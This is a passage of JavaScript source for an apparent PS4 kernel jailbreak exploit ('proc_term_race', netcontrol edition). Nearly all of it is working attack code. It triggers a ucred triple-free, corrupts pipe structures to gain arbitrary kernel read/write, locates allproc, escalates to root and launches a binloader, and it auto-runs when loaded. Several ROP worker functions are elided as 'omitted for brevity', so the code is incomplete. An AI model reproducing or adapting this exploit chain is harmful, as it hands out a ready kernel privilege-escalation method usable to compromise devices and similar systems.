  if (fd > 0) {
    const fp = fget(fd);
    if (fp.gt(new BigInt(0xffff0000, 0x0))) {
      const f_data = kread64(fp.add(0x00));
      const so_pcb = kread64(f_data.add(0x18));
      const in6p_outputopts = kread64(so_pcb.add(0x118));
      kwrite64(in6p_outputopts.add(0x68), new BigInt(0));
    }
  }
}
function remove_uaf_file() {
  if (uaf_socket === undefined) throw new Error("uaf_socket undefined");
  const uafFile = fget(uaf_socket);
  kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));
  let removed = 0;
  for (let i = 0; i < 0x1000; i++) {
    const s = Number(socket(AF_UNIX, SOCK_STREAM, 0));
    if (fget(s).eq(uafFile)) {
      kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0));
      removed++;
    }
    close(new BigInt(s));
    if (removed === 3) break;
  }
}

// ------------------------------------------------------------------
// Final setup: pipe corruption -> arbitrary R/W
// ------------------------------------------------------------------
function setup_arbitrary_rw() {
  const fd_files = kreadslow64(kq_fdp);
  fdt_ofiles = fd_files.add(0x00);
  master_r_pipe_file = kreadslow64(
    fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE),
  );
  victim_r_pipe_file = kreadslow64(
    fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE),
  );
  master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00));
  victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00));

  write32(master_pipe_buf.add(0x00), 0);
  write32(master_pipe_buf.add(0x04), 0);
  write32(master_pipe_buf.add(0x08), 0);
  write32(master_pipe_buf.add(0x0c), PAGE_SIZE);
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data);
  let ret = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
  if (ret.eq(BigInt_Error)) {
    cleanup();
    throw new Error("Netctrl failed - Shutdown and try again");
  }
  for (let i = 0; i < 3; i++) {
    if (kread64(master_r_pipe_data.add(0x10)).eq(victim_r_pipe_data)) break;
    ret = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
    if (ret.eq(BigInt_Error)) {
      cleanup();
      throw new Error("Netctrl failed - Shutdown and try again");
    }
  }
  fhold(fget(master_pipe[0]));
  fhold(fget(master_pipe[1]));
  fhold(fget(victim_pipe[0]));
  fhold(fget(victim_pipe[1]));
  remove_rthr_from_socket(ipv6_socks[triplets[0]]);
  remove_rthr_from_socket(ipv6_socks[triplets[1]]);
  remove_rthr_from_socket(ipv6_socks[triplets[2]]);
  remove_uaf_file();
  log("Arbitrary R/W achieved");
}

function find_allproc() {
  const pid = Number(getpid());
  write32(sockopt_val_buf, pid);
  ioctl(new BigInt(master_pipe[0]), FIOSETOWN, sockopt_val_buf);
  const fp = fget(master_pipe[0]);
  const f_data = kread64(fp.add(0x00));
  const pipe_sigio = kread64(f_data.add(0xd0));
  let p = kread64(pipe_sigio);
  kernel.addr.curproc = p;
  while (
    !p
      .and(new BigInt(0xffffffff, 0x00000000))
      .eq(new BigInt(0xffffffff, 0x00000000))
  ) {
    p = kread64(p.add(0x08));
  }
  return p;
}

function jailbreak() {
  debug("jailbreak - Starting...");
  for (let i = 0; i < 10; i++) sched_yield();
  kernel.addr.allproc = find_allproc();
  kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
  log("Kernel base: " + hex(kernel.addr.base));
  jailbreak_shared(FW_VERSION);
  log("Jailbreak Complete - JAILBROKEN");
  utils.notify("Jailbreak Complete\nEnjoy freedom");
  cleanup(false);
  show_success();
  run_binloader();
}

// ------------------------------------------------------------------
// ROP chain builders (worker loops)
// ------------------------------------------------------------------
function rop_regen_and_loop(last_rop_entry, number_entries) {
  // ... (same as netcontrol) omitted for brevity, see original
}

function spawn_thread(rop_array, loop_entries, predefinedStack) {
  // ... (same as netcontrol) omitted for brevity, see original
}

function iov_recvmsg_worker_rop(ready, run_fd, done, signal_buf) {
  // ... (same as netcontrol) omitted for brevity, see original
}
function uio_readv_worker_rop(ready, run_fd, done, signal_buf) {
  // ... (same as netcontrol) omitted for brevity, see original
}
function uio_writev_worker_rop(ready, run_fd, done, signal_buf) {
  // ... (same as netcontrol) omitted for brevity, see original
}
function ipv6_sock_spray_and_read_rop(ready, run_fd, done, signal_buf) {
  // ... (same as netcontrol) omitted for brevity, see original
}

// ------------------------------------------------------------------
// Entry point (like original procTermExploit but now uses netcontrol)
// ------------------------------------------------------------------
function procTermExploit() {
  log("========================================");
  log("  PS4 NetCtrl Jailbreak (proc_term_race)");
  log("========================================");
  const uidBefore = Number(getuid_sys());
  log("  Before: uid=" + uidBefore);
  if (uidBefore === 0) {
    log("Already root");
    return true;
  }

  FW_VERSION = get_fwversion();
  if (!FW_VERSION) {
    log("Cannot detect FW");
    return false;
  }
  kernel_offset = get_kernel_offset(FW_VERSION);
  log("FW " + FW_VERSION + " offsets loaded");

  // Setup threading and workers
  prev_core = get_current_core();
  prev_rtprio = get_rtprio();
  pin_to_core(MAIN_CORE);
  set_rtprio(MAIN_RTPRIO);
  spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
  for (let i = 0; i < IPV6_SOCK_NUM; i++) {
    build_rthdr(spray_rthdr_rop.add(i * UCRED_SIZE), UCRED_SIZE);
    write32(spray_rthdr_rop.add(i * UCRED_SIZE + 0x04), RTHDR_TAG | i);
  }
  write64(msg.add(0x10), msgIov);
  write64(msg.add(0x18), MSG_IOV_NUM);
  const dummy = malloc(0x1000);
  fill_buffer_64(dummy, new BigInt(0x41414141, 0x41414141), 0x1000);
  write64(uioIovRead.add(0x00), dummy);
  write64(uioIovWrite.add(0x00), dummy);
  socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
  uio_sock_0 = read32(uio_sock);
  uio_sock_1 = read32(uio_sock.add(4));
  socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
  iov_sock_0 = read32(iov_sock);
  iov_sock_1 = read32(iov_sock.add(4));
  for (let i = 0; i < ipv6_socks.length; i++)
    ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
  free_rthdrs(ipv6_socks);
  pipe(pipe_sock);
  master_pipe[0] = read32(pipe_sock);
  master_pipe[1] = read32(pipe_sock.add(4));
  pipe(pipe_sock);
  victim_pipe[0] = read32(pipe_sock);
  victim_pipe[1] = read32(pipe_sock.add(4));
  masterRpipeFd = master_pipe[0];
  masterWpipeFd = master_pipe[1];
  victimRpipeFd = victim_pipe[0];
  victimWpipeFd = victim_pipe[1];
  fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
  fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);
  create_workers();
  init_workers();

  // Main exploit loop
  for (let attempt = 0; attempt < 3; attempt++) {
    if (trigger_ucred_triplefree()) {
      if (leak_kqueue()) {
        setup_arbitrary_rw();
        jailbreak();
        return true;
      }
    }
  }
  log("Exploit failed");
  return false;
}

// Auto-run if not already jailbroken
if (typeof is_jailbroken === "undefined" || !is_jailbroken) {
  log("proc_term_race.js loaded (netcontrol edition)");
  if (typeof window !== "undefined") window.procTermExploit = procTermExploit;
  procTermExploit();
}
